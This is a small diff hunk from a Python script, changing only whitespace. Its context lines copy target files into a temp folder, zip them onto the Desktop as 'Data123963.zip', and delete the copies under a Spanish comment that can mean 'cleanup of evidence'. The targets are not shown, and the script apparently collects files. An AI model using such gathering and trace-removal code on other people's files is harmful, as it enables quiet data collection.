@@ -82,7 +82,7 @@ def main():
             shutil.copy2(TARGET_FILE_PATH[target], COPY_PATH[target])
 
     file = os.getenv("APPDATA") + r'/../../Desktop/Data123963.zip'
-    file = file.replace("/","\\")
+    file = file.replace("/", "\\")
     shutil.make_archive(BasePath + "/../../Desktop/Data123963", "zip", BasePath + "/Temp/Copy/")
     #Limpieza de pruebas
     shutil.rmtree(BasePath + "/Temp/Copy/")
